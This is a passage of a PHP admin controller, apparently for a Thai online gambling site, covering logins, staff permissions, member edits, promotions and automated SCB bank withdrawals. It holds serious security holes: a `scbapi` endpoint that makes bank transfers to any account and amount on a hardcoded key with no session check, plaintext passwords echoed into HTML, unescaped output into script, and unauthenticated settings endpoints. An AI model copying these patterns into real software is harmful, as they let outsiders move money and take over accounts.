<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Admin9919 extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();

		$this->load->library('session');

		$this->load->model('user_model');

		$this->load->model('bank_model');

		$this->load->model('admin_model');
		$this->load->model('report_model');

		$this->load->helper('url');
		$this->load->library('scb');
	}

	private function show($text, $type, $url)
	{
		echo '<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" type="text/javascript"></script>
			
			<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script><script type="text/javascript">$("document").ready(function(){
			
			const Toast = Swal.mixin({
			
			toast: true,
			
			position: "top-end",
			
			showConfirmButton: false,
			
			timer: 1000,
			
			timerProgressBar: true,
			
			onOpen: (toast) => {
			
			toast.addEventListener("mouseenter", Swal.stopTimer)
			
            toast.addEventListener("mouseleave", Swal.resumeTimer)
			
            }
			
			}   )
			
			
			
			Toast.fire({
			
			icon: "' . $type . '",
			
			title: "' . $text . '"
			
			}).then(function() {
			
			window.location.href = "' . $url . '";
			
			});});</script>';
	}

	public function index()
	{
		$username = $this->input->post('username');

		$password = $this->input->post('password');

		$login = $this->input->post('login');

		$secert = $this->input->post('secert');

		if ($this->session->userdata('stats_admin')) {
			$message = 'Admin Page Backend!';
			$username = $this->session->userdata('stats_admin');
			if ($this->session->userdata('stats') == 109) {
				$status =  'Programmer';
			} else if ($this->session->userdata('stats') == 99) {
				$status =  'Admin';
			} else {
				$status =  'Hack';
			}
			$secert = $this->session->userdata('stats') ? $this->session->userdata('stats') : '';
			$this->notify_message_report($message, $username, $secert, $status);
			$ip = $this->input->ip_address();
			$data = [
				'user' => $username,
				'detail' => 'เปิดหน้าแอดมิน',
				'module' => 'Admin Page',
				'ip_address' => $ip
			];
			$this->db->insert('report_activity', $data);
			header('location: ' . base_url('/sys/main'));
		}

		if (isset($login)) {
			$check = $this->admin_model->login($username, $password);

			if ($check) {
				if ($check[0]['stats'] == 99 || $check[0]['stats'] == 109) {
					if ($secert == $check[0]['secert_code']) {
						$this->session->set_userdata('stats_admin', $username);
						$this->session->set_userdata('secert', $secert);
						$this->session->set_userdata('stats', $check[0]['stats']);
						header('location: ' . base_url('/sys/main'));
						$message = 'Login Backend!';
						if ($check[0]['stats'] == 109) {
							$status =  'Programmer';
						} else if ($check[0]['stats'] == 99) {
							$status =  'Admin';
						} else {
							$status =  'Hack';
						}
						$ip = $this->input->ip_address();
						$data = [
							'user' => $username,
							'detail' => 'Login Admin',
							'module' => 'Admin Page',
							'ip_address' => $ip
						];
						$this->db->insert('report_activity', $data);
					} else {
						$message = 'Login Backend Secert Failed!';
						$status = 'No Data';
						$this->show('Secert Code ผิด', 'error', '#');
						$ip = $this->input->ip_address();
						$data = [
							'user' => $username,
							'detail' => 'Secert Code ผิด',
							'module' => 'Admin Page',
							'ip_address' => $ip
						];
						$this->db->insert('report_activity', $data);
					}
				} else {
					$this->session->set_userdata('stats', $check[0]['stats']);
					$this->session->set_userdata('stats_admin', $username);
					header('location: ' . base_url('/sys/main'));
					$message = 'Login Backend Secert Failed!';
					$status = 'Staff';
					$ip = $this->input->ip_address();
					$data = [
						'user' => $username,
						'detail' => 'Login  Staff',
						'module' => 'Admin Page',
						'ip_address' => $ip
					];
					$this->db->insert('report_activity', $data);
				}
			} else {
				$this->show('ชื่อผู้ใช้งานหรือรหัสผ่านผิด', 'error', '#');
				$message = 'Login Backend Failed';
				$status = 'No Data';
				$ip = $this->input->ip_address();
				$data = [
					'user' => $username,
					'detail' => 'User&Pass ผิด Admin Page',
					'module' => 'Admin Page',
					'ip_address' => $ip
				];
				$this->db->insert('report_activity', $data);
			}
			$this->notify_message_report($message, $username, $secert, $status);
		}

		$ip = $this->input->ip_address();
		$data = [
			'user' => '-',
			'detail' => 'เปิดระบบแอดมิน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		return $this->load->view('sys/index');
	}
	private function notify_sent($message, $tt = 1)
	{
		$setting = $this->admin_model->result_setting();
		$token =  "";
		if ($tt == 1) {
			$token =  $setting['token_line'];
		} else if ($tt == 2) {
			$token =  $setting['token_line_game'];
		} else if ($tt == 3) {
			$token =  $setting['token_line_depo'];
		} else if ($tt == 4) {
			$token =  $setting['token_line_with'];
		} else {
			$token =  $setting['token_line'];
		}

		// $token =  $setting['token_line']; //ใส่Token ที่copy เอาไว้
		$str = $message; //ข้อความที่ต้องการส่ง สูงสุด 1000 ตัวอักษร

		$this->notify_message($str, $token);
	}

	private  function notify_message($message, $token)
	{
		$queryData = array('message' => $message);
		$queryData = http_build_query($queryData, '', '&');
		$headerOptions = array(
			'http' => array(
				'method' => 'POST',
				'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
					. "Authorization: Bearer " . $token . "\r\n"
					. "Content-Length: " . strlen($queryData) . "\r\n",
				'content' => $queryData
			),
		);
		$context = stream_context_create($headerOptions);
		$result = file_get_contents(LINE_API, FALSE, $context);
		$res = json_decode($result);
		return $res;
	}
	public function result()
	{
		$user = $this->session->userdata('stats_admin');
		$check = $this->admin_model->admin_stats($user);
		if (($check['stats'] == 109 || $check['stats'] == 99)) {
			if ($user) {
				return $this->load->view('sys/result');
			} else {
				header('location: ./');
			}
		}
	}
	public function Scb_tranfer()
	{
		header('Content-Type: application/json');
		$user = $this->session->userdata('stats_admin');
		if ($user) {
			if ($_POST) {
				$id = $this->input->post('id');
				$stats = $this->input->post('stats');
				$bank_data = $this->admin_model->withdraw_search($id);
				$data =  $this->admin_model->withdraw_manage_select($id);
				$accnum = $bank_data['accnum'];
				$bank = $bank_data['code'];
				$amount = $bank_data['amount'];
				$user_id = $this->user_model->get_user_acc($accnum);
				$user_ufa = $this->user_model->user_ufa($user_id->username);
				$Balance = json_decode($this->Balance($user_id->username), true);
				$money_ufa =  $Balance['balance'];
				$bb = $this->admin_model->bank_w();
				$scb = [
					"accnum" => $bb['accnum'], //เลขบช
					"deviceid" => $bb['username'], //deviceid
					"pin" => $bb['password'], ////api_refresh
				];
				$this->scb->SetLogin($scb['deviceid'], $scb['pin'], $scb['accnum']);
				if ($stats == 'preconfirm') {
					$Verify = $this->scb->Verify($accnum, $bank, $amount);
					echo json_encode($Verify);
				} else if ($stats == 'confirm') {
					$tranfer = $this->scb->Transfer($accnum, $bank, $amount);
					$jsde = json_decode($tranfer, true);

					if ($jsde["status"]["code"] == 1000) {
						$d = [
							"id" => $id,
							"stats" => 0,
						];
						$this->admin_model->update_stats_w($d);

						$staff_data = [

							"username" => $user,

							"type" => 0,

							"detail" => "อนุมัติการถอนเงินออโต้ให้ " . $data['username'] . " จำนวน " . $data['amount'] . " บาท"

						];

						$this->admin_model->staff_h_insert($staff_data);
						echo json_encode(array("status" => true, "message" => $jsde["status"]["description"]));
						$datasend = "";
						$datasend .= "\n✅ อนุมัติการถอนเงินให้ ✅";
						$datasend .= "\nสมาชิก => {$user_ufa['username']}";
						$datasend .= "\nธนาคารลูกค้า =>{$user_id->bank} {$accnum}";
						$datasend .= "\nจำนวนเงินที่ถอน => {$amount} บาท";
						$datasend .= "\nยอดเงินลูกค้าคงเหลือ => {$money_ufa} บาท";
						$datasend .= "\nสถานะ => ดำเนินการเรียบร้อยแล้ว \nโดย : {$user}";
						$this->notify_sent($datasend, 4);
					} else {
						echo json_encode(array("status" => false, "message" => $jsde["status"]["description"]));
					}
				}
			}
		} else {
			header('location: ./');
		}
	}

	public function scbapi($bank, $accnum, $amount, $key)
	{

		if ($key == "CUfL4levur") {
			if ($_POST || true) {
				$bb = $this->admin_model->bank();

				$scb = [
					"accnum" => $bb['accnum'], //เลขบช
					"deviceid" => $bb['username'], //deviceid
					"pin" => $bb['password'], ////api_refresh
				];
				$this->scb->SetLogin($scb['deviceid'], $scb['pin'], $scb['accnum']);
				// print_r($bank);die;

				$tranfer = $this->scb->Transfer($accnum, $bank, $amount);
				// $jsde = json_encode($tranfer, true);
				// print_r($jsde);
				exit($tranfer);
			}
		} else {
		}
	}

	public function main()
	{
		$message = 'Admin Main Page Backend!';
		$username = $this->session->userdata('stats_admin');
		if ($this->session->userdata('stats') == 109) {
			$status =  'Programmer';
		} else if ($this->session->userdata('stats') == 99) {
			$status =  'Admin';
		} else if ($this->session->userdata('stats') == 0) {
			$status =  'Staff';
		}else{
			$status =  'Hack';
		}
		$ip = $this->input->ip_address();
		$data = [
			'user' => $username,
			'detail' => 'เปิดหน้าแอดมิน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		$secert = $this->session->userdata('stats') ? $this->session->userdata('stats') : '';
		$this->notify_message_report($message, $username, $secert, $status);
		$user = $this->session->userdata('stats_admin');

		if ($user) {
			if (isset($_POST['save_setting_auto'])) {
				$credit_min = $this->input->post('credit_min');
				$credit_max = $this->input->post('credit_max');
				$credit_limit = $this->input->post('credit_limit');
				$status = $this->input->post('status');

				$d = [
					"credit_min" => $credit_min,
					"credit_max" => $credit_max,
					"credit_limit" => $credit_limit,
					"status" => $status
				];
				$this->admin_model->update_setting_auto($d);
				header('location: main');
			}
			if (isset($_POST['save_ktb'])) {
				$accnum_ktb = $this->input->post('accnum_ktb');
				$name_ktb = $this->input->post('name_ktb');
				$username_ktb = $this->input->post('username_ktb');
				$password_ktb = $this->input->post('password_ktb');
				$ktb_token = $this->input->post('ktb_token');
				$status_ktb = $this->input->post('status_ktb');
				$d = [
					"accnum_ktb" => $accnum_ktb,
					"name_ktb" => $name_ktb,
					"username_ktb" => $username_ktb,
					"password_ktb" => $password_ktb,
					"ktb_token" => $ktb_token,
					"status_ktb" => $status_ktb
				];
				$this->admin_model->update_bank_ktb($d);
				header('location: main');
			}

			if (isset($_POST['save_ufa'])) {
				$accnum_ktb = $this->input->post('acc_ufa');
				$name_ktb = $this->input->post('ufa_pass');
				$d = [
					"acc_ufa" => $accnum_ktb,
					"ufa_pass" => $name_ktb,
				];
				$this->admin_model->update_acc_ufa($d);
				header('location: main');
			}

			if (isset($_POST['save_line'])) {
				$token_line = trim($this->input->post('token_line'));
				$token_line_game = trim($this->input->post('token_line_game'));
				$token_line_depo = trim($this->input->post('token_line_depo'));
				$token_line_with = trim($this->input->post('token_line_with'));
				$d = [
					"token_line" => $token_line,
					"token_line_game" => $token_line_game,
					"token_line_depo" => $token_line_depo,
					"token_line_with" => $token_line_with,
				];
				$this->admin_model->update_line($d);
				header('location: main');
			}

			if (isset($_POST['save_setting'])) {
				$line = trim($this->input->post('line_id'));


				$name_web = trim($this->input->post('name_web'));

				$d_limit = trim($this->input->post('d_limit'));

				$w_limit = trim($this->input->post('w_limit'));

				$aff_d = trim($this->input->post('aff_d'));

				$aff_m =  trim($this->input->post('aff_m'));

				$d = [
					"line" => $line,
					"name_web" => $name_web,
					"d_limit" => $d_limit,
					"w_limit" => $w_limit,
					"aff_m" => $aff_m,
					"aff_d" => $aff_d
				];

				$this->admin_model->update_setting($d);

				header('location: main');
			}



			return $this->load->view('sys/main');
		} else {
			header('location: ./');
		}
	}
	public function aatest()
	{
		return $this->load->view('errors/html2/error_404');
	}
	public function promotion()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปิดหน้าโปรโมชั่น',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {
			$submit =  $this->input->post('save');
			if (isset($submit)) {
				$percen = $this->input->post('percen');
				$x = $this->input->post('x');
				$data = ['percen' => $percen, 'x' => $x];
				$this->admin_model->add_promotions($data);
				header('location: ./promotion');
			}
			if (isset($_GET['delete'])) {
				$id = $_GET['id'];
				$this->admin_model->del_promotions($id);
				header('location: ./promotion');
			}
			return $this->load->view('sys/promotion');
		} else {
			header('location: ./');
		}
	}
	public function	promotion_history()
	{


		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปิดหน้าโปรโมชั่น',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {

			return $this->load->view('sys/promotion_history');
		} else {
			header('location: ./');
		}
	}
	public function scb_protected()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปิดหน้าตั้งค่า SCB',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {
			$submit =  $this->input->post('save');
			if (isset($submit)) {
				$percen = $this->input->post('percen');
				$x = $this->input->post('x');
				$data = ['percen' => $percen, 'x' => $x];
				$this->admin_model->add_promotions($data);
				header('location: ./scb_protected');
			}
			if (isset($_GET['delete'])) {
				$id = $_GET['id'];
				$this->admin_model->del_promotions($id);
				header('location: ./scb_protected');
			}
			return $this->load->view('sys/scb_protected');
		} else {
			header('location: ./');
		}
	}
	public function withdraw()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ฟังก์ชั่นถอนเงิน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);

		if ($user) {
			if (isset($_GET['manage'])) {
				$id = trim($_GET['id']);

				$stats = trim($_GET['stats']);

				$data =  $this->admin_model->withdraw_manage_select($id);
				$check = $this->admin_model->select_trans($id);
				if ($check['stats'] == 1) {
					if ($stats == "approve") {
						$d = [

							"id" => $id,

							"stats" => 0,

						];

						$this->admin_model->update_stats_w($d);

						$staff_data = [

							"username" => $user,

							"type" => 0,

							"detail" => "อนุมัติการถอนเงินให้ " . $data['username'] . " จำนวน " . $data['amount'] . " บาท"

						];

						$this->admin_model->staff_h_insert($staff_data);
						$user_ufa = $this->user_model->user_ufa($data['username']);
						$this->user_model->clearproid($data['username']);
						$Balance = json_decode($this->Balance($data['username']), true);
						$money_ufa =  $Balance['balance'];
						$this->notify_sent("\nแจ้งเตือนอนุมัติโอนเงิน(ถอนมือ) \nUsername : {$user_ufa['username']}\nเลขบัญชี : {$data['accnum']}\nธนาคาร : {$data['bank_name']}\nจำนวน : {$data['amount']} บาท\nจำนวนเงินคงเหลือ : {$money_ufa} บาท\nโดย : {$user}", 4);
						header('location: ./withdraw');
					} elseif ($stats == "Notapproved") {
						$d = [

							"id" => $id,

							"stats" => 2,

						];

						$this->admin_model->update_stats_w($d);

						$staff_data = [

							"username" => $user,

							"type" => 0,

							"detail" => "ไม่อนุมัติการถอนเงินให้ " . $data['username'] . " จำนวน " . $data['amount'] . " บาท"

						];
						$user_ufa = $this->user_model->user_ufa($data['username']);

						$ddddd = $this->add_credit($user_ufa['username'], $data['amount']);
						// 		print_r($ddddd);die;
						if (empty($ddddd['addcredit'])) {
							$this->show('รายการไม่สำเร็จกรุณาลองใหม่อีกครั้ง', 'error', './withdraw');
							return $this->load->view('sys/withdraw');
						}
						$Balance = json_decode($this->Balance($data['username']), true);
						$money_ufa =  $Balance['balance'];
						$this->admin_model->staff_h_insert($staff_data);
						$this->notify_sent("\n❌แจ้งเตือนยกเลิกโอนเงินให้❌\nUsername : {$user_ufa['username']}\nเลขบัญชี : {$data['accnum']}\nธนาคาร : {$data['bank_name']}\nจำนวน : {$data['amount']} บาท\nจำนวนเงินคงเหลือ : {$money_ufa} บาท\nโดย : {$user}", 4);
						// 		header('location: ./withdraw');
						// die();
						$this->show('ดำเนินการเรียบร้อยแล้ว', 'success', './withdraw');
					} else {
						header('location: ./withdraw');
					}
				} else {
					$this->show('รายการนี้ได้อนุมัติไปแล้ว', 'error', './withdraw');
				}
			} else {
				return $this->load->view('sys/withdraw');
			}
		} else {
			header('location: ./');
		}
	}

	public function staff()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'จัดการ STAFF',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);

		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99)) {
			if ($user) {
				$id = trim($this->input->post('id'));

				$password = trim($this->input->post('password'));

				$member = trim($this->input->post('member'));
				$promotion = trim($this->input->post('promotion'));
				$promotion_history = trim($this->input->post('promotion_history'));
				$withdraw = trim($this->input->post('withdraw'));
				$Deposit = trim($this->input->post('Deposit'));
				$result = trim($this->input->post('result'));
				$report_deposit = trim($this->input->post('report_deposit'));
				$report_withdraw = trim($this->input->post('report_withdraw'));
				$report_finance = trim($this->input->post('report_finance'));
				$staff = trim($this->input->post('staff'));
				$staff_history = trim($this->input->post('staff_history'));
				$setting_wheel = trim($this->input->post('setting_wheel'));
				$report_wheelspin = trim($this->input->post('report_wheelspin'));
				$setting_powyingshup = trim($this->input->post('setting_powyingshup'));
				$report_powyingshup = trim($this->input->post('report_powyingshup'));
				$category = "";

				if ($member) {
					$category .= ",จัดการสมาชิก";
				}


				if ($promotion) {
					$category .= ",โปรโมชั่น";
				}

				if ($promotion_history) {
					$category .= ",ประวัติรับโปรโมชั่น";
				}

				if ($withdraw) {
					$category .= ",ถอนเงิน";
				}

				if ($Deposit) {
					$category .= ",ฝากเงิน";
				}

				if ($result) {
					$category .= ",รายงานผล";
				}

				if ($report_deposit) {
					$category .= ",รายงานการฝากเงิน";
				}

				if ($report_withdraw) {
					$category .= ",รายงานการถอนเงิน";
				}

				if ($report_finance) {
					$category .= ",รายงานการเงิน";
				}

				if ($staff) {
					$category .= ",จัดการพนักงาน";
				}

				if ($staff_history) {
					$category .= ",ประวัติของพนักงาน";
				}

				if ($setting_wheel) {
					$category .= ",ตั้งค่าวงล้อ";
				}

				if ($report_wheelspin) {
					$category .= ",รายงานการสุ่มวงล้อ";
				}

				if ($setting_powyingshup) {
					$category .= ",ตั้งค่าเป่ายิ้งฉุบ";
				}

				if ($report_powyingshup) {
					$category .= ",รายงานการเล่นเป่ายิ้งฉุบ";
				}

				if (isset($_POST['save'])) {
					$d = [
						"password" => $password,
						"category" => $category,
						"id" => $id,

					];



					$this->admin_model->staff_update($d);

					header('location: staff');
				}

				if (isset($_POST['addstaff'])) {
					$username = trim($this->input->post('username'));

					$password = trim($this->input->post('password'));

					$member = trim($this->input->post('member'));
					$promotion = trim($this->input->post('promotion'));
					$promotion_history = trim($this->input->post('promotion_history'));
					$withdraw = trim($this->input->post('withdraw'));
					$Deposit = trim($this->input->post('Deposit'));
					$result = trim($this->input->post('result'));
					$report_deposit = trim($this->input->post('report_deposit'));
					$report_withdraw = trim($this->input->post('report_withdraw'));
					$report_finance = trim($this->input->post('report_finance'));
					$staff = trim($this->input->post('staff'));
					$staff_history = trim($this->input->post('staff_history'));
					$setting_wheel = trim($this->input->post('setting_wheel'));
					$report_wheelspin = trim($this->input->post('report_wheelspin'));
					$setting_powyingshup = trim($this->input->post('setting_powyingshup'));
					$report_powyingshup = trim($this->input->post('report_powyingshup'));
					$category = "";

					if ($member) {
						$category .= ",จัดการสมาชิก";
					}


					if ($promotion) {
						$category .= ",โปรโมชั่น";
					}

					if ($promotion_history) {
						$category .= ",ประวัติรับโปรโมชั่น";
					}

					if ($withdraw) {
						$category .= ",ถอนเงิน";
					}

					if ($Deposit) {
						$category .= ",ฝากเงิน";
					}

					if ($result) {
						$category .= ",รายงานผล";
					}

					if ($report_deposit) {
						$category .= ",รายงานการฝากเงิน";
					}

					if ($report_withdraw) {
						$category .= ",รายงานการถอนเงิน";
					}

					if ($report_finance) {
						$category .= ",รายงานการเงิน";
					}

					if ($staff) {
						$category .= ",จัดการพนักงาน";
					}

					if ($staff_history) {
						$category .= ",ประวัติของพนักงาน";
					}

					if ($setting_wheel) {
						$category .= ",ตั้งค่าวงล้อ";
					}

					if ($report_wheelspin) {
						$category .= ",รายงานการสุ่มวงล้อ";
					}

					if ($setting_powyingshup) {
						$category .= ",ตั้งค่าเป่ายิ้งฉุบ";
					}

					if ($report_powyingshup) {
						$category .= ",รายงานการเล่นเป่ายิ้งฉุบ";
					}


					$check = $this->admin_model->chekusername($username);

					if ($check == 0) {
						$d = [

							"username" => $username,
							"password" => $password,
							"category" => $category

						];

						$this->admin_model->staff_insert($d);

						header('location: staff');
					} else {
						$this->show('มีชื่อผู้ใช้งานนี้แล้ว', 'error', '#');
					}
				}

				if (isset($_GET['delete'])) {
					$id = $_GET['id'];

					$this->admin_model->staff_del($id);

					header('location: staff');
				}

				return $this->load->view('sys/staff');
			} else {
				header('location: ./');
			}
		}
	}

	public function staff_history()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เช็คประวัติ STAFF',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);

		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99)) {
			if ($user) {
				$user = $this->session->userdata('stats_admin');

				if ($user) {
					return $this->load->view('sys/staff_history');
				} else {
					header('location: ./');
				}
			}
		}
	}

	public function results()
	{
		$user = $this->session->userdata('stats_admin');

		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99)) {
			$start = $this->input->post('date_start');

			$end = $this->input->post('date_end');

			$start = date('Y-m-d', strtotime($start));

			$end = date('Y-m-d', strtotime($end));

			$list =  $this->input->post('list');

			$data['start'] = $start;

			$data['end'] = $end;

			$data['type'] = $list;

			return $this->load->view('sys/results', $data);
		}
	}

	public function staffedit()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปลี่ยนข้อมูล STAFF',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);


		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99)) {
			if ($user) {
				$id = $this->input->post('id');

				$data = $this->admin_model->select_staff($id);
				$result = explode(",", $data['category']);

				$html = '
					<form method="post">
					<input type="hidden" id="id" name="id" value="' . $data['id'] . '">
					<div class="form-group">
					<label> ชื่อผู้ใช้งาน</label>
					<input type="text" name="username" class="form-control cc-name valid" value="' . $data['username'] . '" placeholder="ชื่อผู้ใช้งาน" required disabled>
					</div>
					<div class="form-group">
					<label>รหัสผ่าน</label>
					<input type="text" name="password" class="form-control cc-name valid" value="' . $data['password'] . '" placeholder="รหัสผ่าน" required>
					</div>
					     <div class="col-md-auto">
                            <br>
                            <h1>เลือกบทบาท</h1>
                            <br>
                            <div class="row">
                                <div class="col-4">';
				$html .= array_search("จัดการสมาชิก", $result) ? '<input type="checkbox" name="member" checked="checked">' : '<input type="checkbox" name="member">';
				$html .= ' <label class="">จัดการสมาชิก</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("ตั้งค่าบัญชี", $result) ? '<input type="checkbox" name="scb_protected" checked="checked">' : '<input type="checkbox" name="scb_protected">';
				$html .= ' <label class="">ตั้งค่าบัญชี ฝาก - ถอน</label>
                                </div>

                                <div class="col-4">';
				$html .= array_search("โปรโมชั่น", $result) ? '<input type="checkbox" name="promotion" checked="checked">' : '<input type="checkbox" name="promotion">';
				$html .=  '<label class="">โปรโมชั่น</label>
                                </div>

                                <div class="col-4">';
				$html .= array_search("ประวัติรับโปรโมชั่น", $result) ? '<input type="checkbox" name="promotion_history" checked="checked">' : '<input type="checkbox" name="promotion_history">';
				$html .= '<label class="">ประวัติรับโปรโมชั่น</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("ถอนเงิน", $result) ? '<input type="checkbox" name="withdraw" checked="checked">' : '<input type="checkbox" name="withdraw">';
				$html .=  '<label class="">ถอนเงิน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("ฝากเงิน", $result) ? '<input type="checkbox" name="Deposit" checked="checked">' : '<input type="checkbox" name="Deposit">';
				$html .= ' <label class="">ฝากเงิน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("รายงานผล", $result) ? '<input type="checkbox" name="result" checked="checked">' : '<input type="checkbox" name="result">';
				$html .= '<label class="">รายงานผล</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("รายงานฝากเงิน", $result) ? '<input type="checkbox" name="report_deposit" checked="checked">' : '<input type="checkbox" name="report_deposit">';
				$html .= '<label class="">รายงานฝากเงิน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("รายงานถอนเงิน", $result) ? '<input type="checkbox" name="report_withdraw" checked="checked">' : '<input type="checkbox" name="report_withdraw">';
				$html .= '<label class="">รายงานถอนเงิน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("รายงานการเงิน", $result) ? '<input type="checkbox" name="report_finance" checked="checked">' : '<input type="checkbox" name="report_finance">';
				$html .= '<label class="">รายงานการเงิน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("จัดการพนักงาน", $result) ? '<input type="checkbox" name="staff" checked="checked">' : '<input type="checkbox" name="staff">';
				$html .= '<label class="">จัดการพนักงาน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("ประวัติของพนักงาน", $result) ? '<input type="checkbox" name="staff_history" checked="checked">' : '<input type="checkbox" name="staff_history">';
				$html .= '<label class="">ประวัติของพนักงาน</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("ตั้งค่าวงล้อ", $result) ? '<input type="checkbox" name="setting_wheel" checked="checked">' : '<input type="checkbox" name="setting_wheel">';
				$html .= '<label class="">ตั้งค่าวงล้อ</label>
                                </div>
                                <div class="col-4">';
				$html .= array_search("รายงานการสุ่มวงล้อ", $result) ? '<input type="checkbox" name="report_wheelspin" checked="checked">' : '<input type="checkbox" name="report_wheelspin">';
				$html .= '<label class="">รายงานการสุ่มวงล้อ</label>
                                </div>
								<div class="col-4">';
				$html .= array_search("ตั้งค่าเป่ายิ้งฉุบ", $result) ? '<input type="checkbox" name="setting_powyingshup" checked="checked">' : '<input type="checkbox" name="setting_powyingshup">';
				$html .= '<label class="">ตั้งค่าเป่ายิ้งฉุบ</label>
                                </div>
								<div class="col-4">';
				$html .= array_search("รายงานการเล่นเป่ายิ้งฉุบ", $result) ? '<input type="checkbox" name="report_powyingshup" checked="checked">' : '<input type="checkbox" name="report_powyingshup">';
				$html .= '<label class="">รายงานการเล่นเป่ายิ้งฉุบ</label>
                                </div>
                            </div>
                        </div>
					<input type="submit" name="save" value="บันทึก"class="btn btn-success">
					<br>
					</form>';
				echo $html;
			} else {
				header('location: ./');
			}
		}
	}

	public function member()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปิดหน้า MEMBER',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);


		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				if (isset($_GET['delete'])) {
					$user = $_GET['username'];

					$this->admin_model->delete_user($user);

					$staff_data = [

						"username" => $this->session->userdata('stats_admin'),

						"type" => 0,

						"detail" => "ลบข้อมูล ชื่อผู้ใช้งาน " . $user

					];

					$this->admin_model->staff_h_insert($staff_data);

					header('location: member');
				}

				$id = trim($this->input->post('id'));

				$password = trim($this->input->post('password'));

				$name = trim($this->input->post('name'));

				$accnum = trim($this->input->post('accnum'));

				$bank_code = trim($this->input->post('bank'));

				$username = trim($this->input->post('username'));

				$promotion = trim($this->input->post('promotion'));

				if (isset($_POST['save'])) {
					$d = [

						"password" => $password,

						"name" => $name,

						"accnum" => $accnum,

						"bank" => $bank_code,

						"id" => $id,
						"promotion_id" => $promotion,



					];

					$staff_data = [

						"username" => $user,

						"type" => 0,

						"detail" => "แก้ไขข้อมูล ของคุณ " . $name

					];

					$this->admin_model->staff_h_insert($staff_data);

					$this->admin_model->update_user($d);



					header('location: member');
				}



				return $this->load->view('sys/member', ["checkadmin" => $check]);
			} else {
				header('location: ./');
			}
		}
	}

	public function Deposit()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปิดหน้า Deposit',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);


		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				return $this->load->view('sys/deposit');
			} else {
				header('location: ./');
			}
		}
	}
	// ตั้งค่าโปร

	public function setting_pro1()
	{

		$name_pro = $this->input->post('name');
		$p_pro = $this->input->post('percen_1');
		$x_pro = $this->input->post('x_1');
		$text_pro = $this->input->post('text');
		$id_pro = $this->input->post('id_pro');
		$limit = $this->input->post('limit_1');

		$data = array(

			'id' => $id_pro,
			'name' => $name_pro,
			'percen' => $p_pro,
			'x' => $x_pro,
			'text' => $text_pro,
			'limit_d' => $limit
		);

		//print_r($data);die;

		$this->admin_model->edit_proregister($data);
		header('Content-Type: application/json');
		echo json_encode(['status' => true, 'msg' => 'ทำรายการแก้ไข สำเร็จครับ']);
	}

	public function setting_pro_register()
	{

		$name_pro = $this->input->post('name_1');
		$p_pro = $this->input->post('percen_2');
		$x_pro = $this->input->post('x_2');
		$text_pro = $this->input->post('text_1');
		$id_pro_1 = $this->input->post('id_pro_1');
		$limit = $this->input->post('limit_2');

		$data = array(

			'id' => $id_pro_1,
			'name' => $name_pro,
			'percen' => $p_pro,
			'x' => $x_pro,
			'text' => $text_pro,
			'limit_d' => $limit
		);

		//print_r($data);die;

		$this->admin_model->edit_proregister_1($data);
		header('Content-Type: application/json');
		echo json_encode(['status' => true, 'msg' => 'ทำรายการแก้ไข สำเร็จครับ']);
	}

	public function save_seting_2()
	{

		$name_pro = $this->input->post('name_all');
		$p_pro = $this->input->post('percen_all');
